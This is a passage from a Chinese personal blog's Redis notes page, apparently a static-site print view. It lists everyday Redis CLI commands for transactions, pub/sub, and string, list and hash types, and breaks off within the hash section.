@@ -1,0 +1,396 @@
+<!doctype html><html lang=zh-cn class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.94.0"><link rel=canonical type=text/html href=/note/data/><link rel=alternate type=application/rss+xml href=/note/data/index.xml><meta name=robots content="noindex, nofollow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Data | Jerry Will's Blog</title><meta name=description content><meta property="og:title" content="Data"><meta property="og:description" content="一个简洁的博客网站"><meta property="og:type" content="website"><meta property="og:url" content="/note/data/"><meta property="og:site_name" content="Jerry Will's Blog"><meta itemprop=name content="Data"><meta itemprop=description content="一个简洁的博客网站"><meta name=twitter:card content="summary"><meta name=twitter:title content="Data"><meta name=twitter:description content="一个简洁的博客网站"><link rel=preload href=/scss/main.min.704093cd1a56f37fd00dc35c7125fced09d88d60c92d59965b30c8c0eeef1cd5.css as=style><link href=/scss/main.min.704093cd1a56f37fd00dc35c7125fced09d88d60c92d59965b30c8c0eeef1cd5.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.5.1.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script>
+<link rel=stylesheet href=/css/prism.css><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-section><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class="text-uppercase font-weight-bold">Jerry Will's Blog</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/blog/><span>博客</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/docs/><span>文档</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/note/><span class=active>笔记</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/book/><span>阅读</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/about/><span>关于</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; 站内搜索…" aria-label=站内搜索… autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><div class=td-content><div class="pageinfo pageinfo-primary d-print-none"><p>这是本节的多页打印视图。
+<a href=# onclick="return print(),!1">点击此处打印</a>.</p><p><a href=/note/data/>返回本页常规视图</a>.</p></div><h1 class=title>Data</h1><ul><li>1: <a href=#pg-2e00564b0ea300976d1ad8d596d5f739>Redis</a></li><ul><li>1.1: <a href=#pg-05b80718169ec1f22b7e9d9ffbc9505c>Redis Cli</a></li><li>1.2: <a href=#pg-8f0353598df69f3e7c11865a43db9194>Redis Deploy</a></li><li>1.3: <a href=#pg-a50750f8fdbf9a4ffa760b43c06b1ce0>Redis Hack</a></li><li>1.4: <a href=#pg-7e41964b8f886f52f56e7ee3cfb9f724>Redis Persistence</a></li><li>1.5: <a href=#pg-2c1626fdaa60068350cecb90c22c19f0>Redis Sentinel</a></li><li>1.6: <a href=#pg-81887b63bae4473c1844dee135eb615e>Redis Type</a></li></ul></ul><div class=content></div></div><div class=td-content><h1 id=pg-2e00564b0ea300976d1ad8d596d5f739>1 - Redis</h1></div><div class=td-content><h1 id=pg-05b80718169ec1f22b7e9d9ffbc9505c>1.1 - Redis Cli</h1><h2 id=事务>事务</h2><ul><li><h4 id=multi-开启事务><code>multi</code> 开启事务</h4></li><li><h4 id=exec-提交事务执行队列中的所有命令><code>exec</code> 提交事务，执行队列中的所有命令</h4></li><li><h4 id=discard-放弃执行事务清空事务队列><code>discard</code> 放弃执行事务，清空事务队列</h4></li><li><h4 id=watch-key1-key2-监听某个键如果在exec之前被更改了则放弃执行事务><code>watch key1 [key2...]</code> 监听某个键，如果在exec之前被更改了，则放弃执行事务</h4></li><li><h4 id=unwatch-key1-取消目前对键的监视客户端断开连接也会取消监视><code>unwatch [key1...]</code> 取消目前对键的监视，客户端断开连接也会取消监视</h4></li></ul><h2 id=发布与订阅>发布与订阅</h2><ul><li><h4 id=subscribe-key1-key2-订阅频道支持通配符的版本-psubscribe><code>subscribe key1 [key2...]</code> 订阅频道，支持通配符的版本 <code>psubscribe</code></h4></li><li><h4 id=unsubscribe-key1-key2-取消订阅频道支持通配符的版本-punsubscribe><code>unsubscribe key1 [key2...]</code> 取消订阅频道，支持通配符的版本 <code>punsubscribe</code></h4></li><li><h4 id=publish-key-value-key2-发布消息到频道><code>publish key value [key2...]</code> 发布消息到频道</h4></li><li><h4 id=pubsub-自省><code>pubsub</code> 自省</h4></li></ul><h2 id=类型操作>类型操作</h2><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>keys *
+</span></span></code></pre></div><h3 id=string>string</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#204a87>set</span> k v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># string</span>
+</span></span><span style=display:flex><span><span style=color:#204a87>type</span> k
+</span></span><span style=display:flex><span>get k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># return old value</span>
+</span></span><span style=display:flex><span>getset k v
+</span></span><span style=display:flex><span>mset k1 v1 k2 v2
+</span></span><span style=display:flex><span>mget k1 k2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># set if not exsit</span>
+</span></span><span style=display:flex><span>msetnx k1 v1 k2 v2
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># append to the tail</span>
+</span></span><span style=display:flex><span>append k v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># string legnth</span>
+</span></span><span style=display:flex><span>strlen k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># increment a number string, k++</span>
+</span></span><span style=display:flex><span>incr k
+</span></span><span style=display:flex><span>decr k
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># k += d</span>
+</span></span><span style=display:flex><span>incrby k d
+</span></span><span style=display:flex><span>decrby k d
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 覆写，从偏移量offset 开始</span>
+</span></span><span style=display:flex><span>setrange k offset v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 子串，含两端</span>
+</span></span><span style=display:flex><span>getrange k start end
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 设置或清除指定偏移量上的位</span>
+</span></span><span style=display:flex><span>setbit k offset v
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>setnx k v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># expire in seconds</span>
+</span></span><span style=display:flex><span><span style=color:#204a87>set</span> k v ex seconds nx
+</span></span></code></pre></div><h3 id=list>list</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 将一个或多个值 value插入到列表 key 的表头</span>
+</span></span><span style=display:flex><span>lpush k v1 v2
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># push if exist</span>
+</span></span><span style=display:flex><span>lpushx k v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回列表 key 中指定区间内的元素，区间以偏移量 start=0 和 end=-1 指定</span>
+</span></span><span style=display:flex><span>lrange key start end
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 移除并返回列表 key 的头元素</span>
+</span></span><span style=display:flex><span>lpop k
+</span></span><span style=display:flex><span>llen k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 从头部开始移除列表中与参数 value 相等的元素</span>
+</span></span><span style=display:flex><span>lrem k count v
+</span></span><span style=display:flex><span>lset k index v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 返回列表 key 中，下标为 index 的元素</span>
+</span></span><span style=display:flex><span>lindex k index
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 修剪</span>
+</span></span><span style=display:flex><span>ltrim k start end
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 将值 value 插入到列表 key 当中，位于值 p 之前或之后 after</span>
+</span></span><span style=display:flex><span>linsert k before p v
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 将一个或多个值 value插入到列表 key 的表尾</span>
+</span></span><span style=display:flex><span>rpush k v1 v2
+</span></span><span style=display:flex><span>rpushx k v
+</span></span><span style=display:flex><span>rpop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 在一个原子时间内，执行两个动作：</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 将列表 src 中的尾元素弹出返回，并插入到列表 dest</span>
+</span></span><span style=display:flex><span>rpoplpush src dest
+</span></span></code></pre></div><h3 id=hash>hash</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>hset k f v
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 将哈希表 key 中的域 field 的值设置为 value ，当且仅当域 field 不存在。</span>
+</span></span><span style=display:flex><span>hsetnx k f v
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>hexists k f
+</span></span><span style=display:flex><span>hlen k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># 删除哈希表 key 中的一个或多个指定域，不存在的域将被忽略。</span>
